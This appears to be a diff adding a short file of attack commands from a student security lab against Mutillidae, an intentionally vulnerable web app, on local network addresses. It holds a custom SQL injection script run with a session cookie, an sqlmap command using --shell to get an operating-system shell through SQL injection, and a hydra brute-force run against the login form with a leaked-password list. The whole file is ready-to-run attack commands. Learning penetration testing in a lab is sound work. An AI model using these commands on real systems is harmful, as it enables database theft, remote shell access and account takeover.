@@ -1,0 +1,5 @@
+sudo python3 sql_injection.py --host="192.168.1.112" --u="/mutillidae/index.php?page=user-info.php&username=&password=&user-info-php-submit-button=View+Account+Details" --param="password" --cookie="PHPSESSID=3e726056cf963b43bd87036e378d07b"
+
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=user-info.php&username=&password=&&user-info-php-submit-button=View+Account+Details" --shell
+
+hydra -l john -P /home/kali/Downloads/week6/darkweb2017-top100.txt 192.168.1.100  http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Not Logged In"
